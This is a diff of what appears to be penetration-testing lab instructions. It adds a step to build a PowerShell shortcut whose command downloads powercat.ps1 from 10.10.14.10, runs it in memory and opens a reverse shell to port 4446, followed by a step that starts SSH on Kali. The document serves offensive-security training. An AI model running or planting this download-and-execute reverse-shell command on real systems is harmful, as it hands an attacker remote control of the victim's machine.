@@ -6,7 +6,10 @@ Log in as: Administrator
 
 Instructions (after completing setup): 
 
-Create the PowerShell shortcut file and transfer it back to Kali:
+1. Create the PowerShell shortcut file:
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.10:8002/powercat.ps1'); powercat -c 10.10.14.10 -p 4446 -e powershell"
+
+2. Transfer it back to Kali:
 ┌──(kali㉿kali)-[~/webdav]
 └─$ sudo systemctl start ssh  
 
